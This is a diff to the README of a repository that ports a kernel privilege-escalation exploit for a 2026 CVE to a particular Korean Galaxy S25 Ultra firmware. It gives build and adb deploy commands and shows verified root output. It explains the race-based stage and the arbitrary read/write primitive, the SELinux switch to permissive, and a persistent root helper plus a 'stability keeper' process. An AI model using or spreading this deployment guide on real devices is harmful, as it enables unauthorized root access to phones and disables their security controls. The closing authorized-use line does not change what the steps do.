@@ -1,4 +1,4 @@
-# CVE-2026-43499 - Galaxy S25 Ultra 
+# CVE-2026-43499 - Galaxy S25 Ultra
 
 This repository contains a device-specific port of the CVE-2026-43499
 exploit for the Korean Samsung Galaxy S25 Ultra.
@@ -38,27 +38,31 @@ The upstream Apache License 2.0 is retained in [LICENSE](LICENSE).
 - Added a KDP-safe `system_unbound_wq` user-mode-helper root path.
 - Added a socket-backed root command helper at
   `/data/local/tmp/cve-2026-43499-root`.
+- Restores the global ashmem FOPS pointer immediately after establishing the
+  arbitrary read/write primitive.
+- Retains reclaimed pages in a detached `cve43499-hold` process after success
+  so dangling kernel references cannot be recycled into unrelated slab objects.
 
 ## Build
 
 Set `ANDROID_NDK_HOME` to Android NDK r29 or a compatible toolchain, then run:
 
 ```sh
-make -j8 PROJECT=pa3q-S938NKSUACZF1
+make -j8
 ```
 
 Outputs:
 
 ```text
-build/pa3q-S938NKSUACZF1/bin/preload.so
-build/embed/su_daemon_aarch64_pie
+build/cve-2026-43499
+build/cve-2026-43499-root
 ```
 
 ## Deploy
 
 ```sh
-adb push build/pa3q-S938NKSUACZF1/bin/preload.so /data/local/tmp/cve-2026-43499
-adb push build/embed/su_daemon_aarch64_pie /data/local/tmp/cve-2026-43499-root
+adb push build/cve-2026-43499 /data/local/tmp/cve-2026-43499
+adb push build/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
 adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root
 ```
 
@@ -74,6 +78,7 @@ Verified result on `S938NKSUACZF1`:
 ```text
 root umh result wake=1 complete=1 retval=0 socket=1
 pipe-physrw-summary done=1 root=1
+stability keeper pid=<pid> retaining reclaimed kernel pages
 uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
 ```
 
@@ -81,5 +86,20 @@ The initial pselect stage is race-based. A run that exits with `root=0`
 before reaching the physical read/write stage can be retried. Successful
 execution switches SELinux to permissive and starts the root helper until the
 next reboot.
+
+## Stability keeper
+
+The exploit intentionally leaves a detached process named `cve43499-hold`
+after a successful run. It owns the socket buffers and pipe slabs that back
+the forged kernel objects. Do not kill it while using the temporary root
+session; releasing those allocations can leave stale kernel references and
+cause a delayed panic. The process and all retained allocations disappear on
+the next reboot.
+
+Confirm that it is present after `root=1`:
+
+```sh
+adb shell "pidof cve43499-hold"
+```
 
 Use only on devices you own or are explicitly authorized to test.
